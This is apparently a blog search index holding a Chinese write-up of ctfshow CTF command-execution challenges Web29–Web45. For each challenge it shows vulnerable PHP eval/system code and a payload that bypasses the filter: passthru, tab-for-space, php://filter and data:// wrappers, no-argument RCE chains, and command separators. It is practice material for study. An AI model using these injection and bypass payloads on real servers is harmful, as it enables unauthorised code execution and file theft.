<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ctfshow命令执行刷题记录</title>
      <link href="/2021/09/29/ctfshow-ming-ling-zhi-xing-shua-ti-ji-lu/"/>
      <url>/2021/09/29/ctfshow-ming-ling-zhi-xing-shua-ti-ji-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="Web29"><a href="#Web29" class="headerlink" title="Web29"></a>Web29</h1><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 00:26:48# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre><p>分析源码，它过滤了flag</p><pre class=" language-bash"><code class="language-bash">?c<span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">"cat fl*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h1 id="Web30"><a href="#Web30" class="headerlink" title="Web30"></a>Web30</h1><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 00:42:26# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;    $c = $_GET[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag|system|php/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;        eval($c);    &amp;#125;    &amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125;</span></code></pre><p>分析发现，<code>system</code>函数，以及<code>flag</code>、<code>php</code>被过滤，所以考虑使用其他函数</p><p>PHP提供4个专门的执行外部命令的函数<code>exec()</code>、<code>system()</code>、<code>passthru()</code>、<code>shell_exec()</code></p><p>能够直接显示在网页上的只有两个函数，<code>system()</code>和<code>passthru()</code></p><p>所以直接</p><pre class=" language-bash"><code class="language-bash">?c<span class="token operator">=</span>passthru<span class="token punctuation">(</span><span class="token string">"cat fl*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h1 id="Web31"><a href="#Web31" class="headerlink" title="Web31"></a>Web31</h1><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 00:49:10# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;    $c = $_GET[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag|system|php|cat|sort|shell|\.| |\'/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;        eval($c);    &amp;#125;    &amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125;</span></code></pre><p>过滤了<code>system</code>、<code>cat</code>，考虑使用<code>more</code>代替<code>cat</code>使用tab(%09)替代空格，使用<code>passthru</code>代替<code>system</code></p><p>所以直接</p><pre class=" language-bash"><code class="language-bash">?c<span class="token operator">=</span>passthru<span class="token punctuation">(</span><span class="token string">"more%09fl*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h1 id="Web32"><a href="#Web32" class="headerlink" title="Web32"></a>Web32</h1><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 00:56:31# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;    $c = $_GET[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;        eval($c);    &amp;#125;    &amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125;</span></code></pre><p>过滤了空格可以用<code>$&#123;IFS&#125;</code>和<code>%0a</code>代替，分号可以用<code>?&gt;</code>代替</p><p>但是过滤了<code>(</code>可太难了，后来考虑考虑哪些函数不需要用到括号</p><p>翻看了羽大佬的wp后，发现<code>include</code>可以不用括号</p><p>下面是其他不用括号的函数</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">echo</span> <span class="token number">666</span><span class="token punctuation">;</span><span class="token keyword">print</span> <span class="token number">666</span><span class="token punctuation">;</span><span class="token keyword">die</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">"/etc/passwd"</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string">"/etc/passwd"</span><span class="token punctuation">;</span><span class="token keyword">include_once</span> <span class="token string">"/etc/passwd"</span><span class="token punctuation">;</span><span class="token keyword">require_once</span> <span class="token string">"/etc/passwd"</span><span class="token punctuation">;</span></code></pre><p><code>php://input</code>是个可以访问请求的原始数据的只读流</p><p>php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取；根据名字，filter，可以很容易想到这个协议可以用来过滤一些东西；</p><table><thead><tr><th>名称</th><th>描述</th><th>备注</th></tr></thead><tbody><tr><td>resource=&lt;要过滤的数据流&gt;</td><td>指定了你要筛选过滤的数据流。</td><td>必选</td></tr><tr><td>read=&lt;读链的筛选列表&gt;</td><td>可以设定一个或多个过滤器名称，以管道符（|）分隔。</td><td>可选</td></tr><tr><td>write=&lt;写链的筛选列表&gt;</td><td>可以设定一个或多个过滤器名称，以管道符（|）分隔。</td><td>可选</td></tr><tr><td>&lt;；两个链的筛选列表&gt;</td><td>任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</td><td></td></tr></tbody></table><p><code>convert.base64-encode</code>和 <code>convert.base64-decode</code>使用这两个过滤器等同于分别用 <a href="https://www.php.net/manual/zh/function.base64-encode.php">base64_encode()</a>和 <a href="https://www.php.net/manual/zh/function.base64-decode.php">base64_decode()</a>函数处理所有的流数据</p><pre class=" language-bash"><code class="language-bash">?c<span class="token operator">=</span>include<span class="token variable">$_POST</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span>?<span class="token operator">></span>post:a<span class="token operator">=</span>php://filter/read<span class="token operator">=</span>convert.base64-encode/resource<span class="token operator">=</span>flag.php</code></pre><p>把得到的数据进行base64解码得到flag</p><h1 id="Web33"><a href="#Web33" class="headerlink" title="Web33"></a>Web33</h1><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 00:56:31# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;    $c = $_GET[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;        eval($c);    &amp;#125;    &amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125;</span></code></pre><p>多过滤了个双引号，继续冲</p><pre class=" language-bash"><code class="language-bash">?c<span class="token operator">=</span>include<span class="token variable">$_POST</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span>?<span class="token operator">></span>post:a<span class="token operator">=</span>php://filter/read<span class="token operator">=</span>convert.base64-encode/resource<span class="token operator">=</span>flag.php</code></pre><h1 id="Web34"><a href="#Web34" class="headerlink" title="Web34"></a>Web34</h1><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php/*<span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 04:21:29# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if(isset($_GET['c']))&amp;#123;    $c = $_GET['c'];    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i", $c))&amp;#123;        eval($c);    &amp;#125;    &amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125;</span></code></pre><p>多过滤了一个冒号</p><pre class=" language-bash"><code class="language-bash">?c<span class="token operator">=</span>include<span class="token variable">$_GET</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span>?<span class="token operator">></span><span class="token operator">&amp;</span>a<span class="token operator">=</span>php://filter/read<span class="token operator">=</span>convert.base64-encode/resource<span class="token operator">=</span>flag.php</code></pre><h1 id="Web35"><a href="#Web35" class="headerlink" title="Web35"></a>Web35</h1><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 04:21:23# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;    $c = $_GET[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\&lt;|\=/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;        eval($c);    &amp;#125;    &amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125;</span></code></pre><p>多过滤一个&lt;号和一个=号，不过没有影响，继续使用前面的payload</p><pre class=" language-bash"><code class="language-bash">?c<span class="token operator">=</span>include<span class="token variable">$_GET</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span>?<span class="token operator">></span><span class="token operator">&amp;</span>a<span class="token operator">=</span>php://filter/read<span class="token operator">=</span>convert.base64-encode/resource<span class="token operator">=</span>flag.php</code></pre><h1 id="Web36"><a href="#Web36" class="headerlink" title="Web36"></a>Web36</h1><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 04:21:16# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;    $c = $_GET[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\&lt;|\=|\/|[0-9]/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;        eval($c);    &amp;#125;    &amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125;</span></code></pre><p>这次增加过滤数字，但还是没有影响，继续使用前面payload</p><pre class=" language-bash"><code class="language-bash">?c<span class="token operator">=</span>include<span class="token variable">$_GET</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span>?<span class="token operator">></span><span class="token operator">&amp;</span>a<span class="token operator">=</span>php://filter/read<span class="token operator">=</span>convert.base64-encode/resource<span class="token operator">=</span>flag.php</code></pre><h1 id="Web37"><a href="#Web37" class="headerlink" title="Web37"></a>Web37</h1><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 05:18:55# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token comment" spellcheck="true">//flag in flag.phperror_reporting(0);if(isset($_GET['c']))&amp;#123;    $c = $_GET['c'];    if(!preg_match("/flag/i", $c))&amp;#123;        include($c);        echo $flag;        &amp;#125;        &amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125;</span></code></pre><p>新题，这次使用了include语句，过滤了flag</p><p>直接上data伪协议</p><pre class=" language-bash"><code class="language-bash">?c<span class="token operator">=</span>data://text/plain,<span class="token operator">&lt;</span>?<span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">"cat fla*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span></code></pre><h1 id="Web38"><a href="#Web38" class="headerlink" title="Web38"></a>Web38</h1><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 05:23:36# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token comment" spellcheck="true">//flag in flag.phperror_reporting(0);if(isset($_GET['c']))&amp;#123;    $c = $_GET['c'];    if(!preg_match("/flag|php|file/i", $c))&amp;#123;        include($c);        echo $flag;        &amp;#125;        &amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125;</span></code></pre><p>分析了一波，过滤<code>flag</code>、<code>php</code>、<code>file</code>，上一个payload继续用</p><pre class=" language-bash"><code class="language-bash">?c<span class="token operator">=</span>data://text/plain,<span class="token operator">&lt;</span>?<span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">"cat fla*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span></code></pre><h1 id="Web39"><a href="#Web39" class="headerlink" title="Web39"></a>Web39</h1><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 06:13:21# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token comment" spellcheck="true">//flag in flag.phperror_reporting(0);if(isset($_GET['c']))&amp;#123;    $c = $_GET['c'];    if(!preg_match("/flag/i", $c))&amp;#123;        include($c.".php");    &amp;#125;        &amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125;</span></code></pre><p>这次减少了过滤，但是会再后面加上.php的后缀，然而我们前面的payload结尾是有一个?&gt;进行了标签闭合，所以?&gt;.php没有影响，继续使用前面payload</p><pre class=" language-bash"><code class="language-bash">?c<span class="token operator">=</span>data://text/plain,<span class="token operator">&lt;</span>?<span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">"cat fla*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span></code></pre><h1 id="Web40"><a href="#Web40" class="headerlink" title="Web40"></a>Web40</h1><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 06:03:36# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;    $c = $_GET[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&amp;#123;|\[|\]|\&amp;#125;|\:|\'|\"|\,|\&lt;|\.|\>|\/|\?|\\\\/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;        eval($c);    &amp;#125;        &amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125;</span></code></pre><p>回到了eval，但是过滤了很多东西，没有过滤掉英文的<code>()</code>，考虑使用无参数的rce进行构造读取文件</p><table><thead><tr><th>名称</th><th>作用</th></tr></thead><tbody><tr><td>print_r(scandir(‘.’))</td><td>查看当前目录下的所有文件名</td></tr><tr><td>localeconv()</td><td>函数返回一包含本地数字及货币格式信息的数组</td></tr><tr><td>current()</td><td>函数返回数组中的当前元素（单元），默认取第一个值，pos是current的别名</td></tr></tbody></table><p>我们先打印出当前目录下的文件</p><pre class=" language-bash"><code class="language-bash">?c<span class="token operator">=</span>print_r<span class="token punctuation">(</span>scandir<span class="token punctuation">(</span>current<span class="token punctuation">(</span>localeconv<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">))</span><span class="token punctuation">;</span></code></pre><p><img src="https://gitee.com/AAWG/image/raw/master/202109280849465.png" alt="image-20210928084929929"></p><p>读取目录后发现，输出的是数组，而文件名是数组中的值，下一步我们需要取出想要读取文件的数组</p><table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td>each()</td><td>返回数组中当前的键/值对并将数组指针向前移动一步</td></tr><tr><td>end()</td><td>将数组的内部指针指向最后一个单元</td></tr><tr><td>next()</td><td>将数组中的内部指针向前移动一位</td></tr><tr><td>prev()</td><td>将数组中的内部指针倒回一位</td></tr><tr><td>array_reverse()</td><td>以相反的元素顺序返回数组</td></tr><tr><td>getcwd()</td><td>获取当前路径</td></tr><tr><td>show_source()</td><td>显示高亮代码</td></tr></tbody></table><p>payload</p><pre class=" language-bash"><code class="language-bash">?c<span class="token operator">=</span>show_source<span class="token punctuation">(</span>next<span class="token punctuation">(</span>array_reverse<span class="token punctuation">(</span>scandir<span class="token punctuation">(</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">))</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h1 id="Web41"><a href="#Web41" class="headerlink" title="Web41"></a>Web41</h1><p>无法成功</p><h1 id="Web42"><a href="#Web42" class="headerlink" title="Web42"></a>Web42</h1><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-05 20:51:55# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;    $c=$_GET[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">.</span><span class="token string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125;</span></code></pre><p>这次后面多了一个” &gt;/dev/null 2&gt;&amp;1”语句，意思是写入的内容会永远消失，也就是不进行回显</p><pre class=" language-bash"><code class="language-bash">1：<span class="token operator">></span> 代表重定向到哪里，例如：echo “123” <span class="token operator">></span> /home/123.txt2：/dev/null 代表空设备文件3：2<span class="token operator">></span> 表示stderr标准错误4：<span class="token operator">&amp;</span> 表示等同于的意思，2<span class="token operator">></span><span class="token operator">&amp;</span>1，表示2的输出重定向等同于15：1 表示stdout标准输出，系统默认值是1，所以<span class="token string">">/dev/null"</span>等同于 “1<span class="token operator">></span>/dev/null”因此，<span class="token operator">></span>/dev/null 2<span class="token operator">></span><span class="token operator">&amp;</span>1 也可以写成“1<span class="token operator">></span> /dev/null 2<span class="token operator">></span> <span class="token operator">&amp;</span>1”那么本文标题的语句执行过程为：1<span class="token operator">></span>/dev/null ：首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，也就是不显示任何信息。2<span class="token operator">></span><span class="token operator">&amp;</span>1 ： 接着，标准错误输出重定向到标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。</code></pre><p>输出就会被吞掉不进行回显，那该怎么办呢？其实很简单，用<code>;</code>号或者<code>||</code>等等一些命令分隔符进行命令分隔</p><p>payload</p><pre class=" language-bash"><code class="language-bash">?c<span class="token operator">=</span>cat flag.php<span class="token punctuation">;</span></code></pre><h1 id="Web43"><a href="#Web43" class="headerlink" title="Web43"></a>Web43</h1><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php/*<span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-05 21:32:51# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET['c']))&amp;#123;    $c=$_GET['c'];    if(!preg_match("/\;|cat/i", $c))&amp;#123;        system($c." >/dev/null 2>&amp;1");    &amp;#125;&amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125;</span></code></pre><p>payload：</p><pre class=" language-bash"><code class="language-bash">?c<span class="token operator">=</span>tac flag.php<span class="token operator">||</span></code></pre><h1 id="Web44"><a href="#Web44" class="headerlink" title="Web44"></a>Web44</h1><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-05 21:32:01# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;    $c=$_GET[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/;|cat|flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;        system($c.</span><span class="token string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;&amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125;</span></code></pre><p>加了一个flag的过滤</p><p>Payload</p><pre class=" language-bash"><code class="language-bash">?c<span class="token operator">=</span>tac fl*<span class="token operator">||</span></code></pre><h1 id="Web45"><a href="#Web45" class="headerlink" title="Web45"></a>Web45</h1><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-05 21:35:34# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;    $c=$_GET[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\;|cat|flag| /i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;        system($c.</span><span class="token string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;&amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125;</span></code></pre><p>加了空格过滤，可以考虑使用%09代替空格</p><p>Payload:</p><pre class=" language-bash"><code class="language-bash">?c<span class="token operator">=</span>tac%09fl*<span class="token 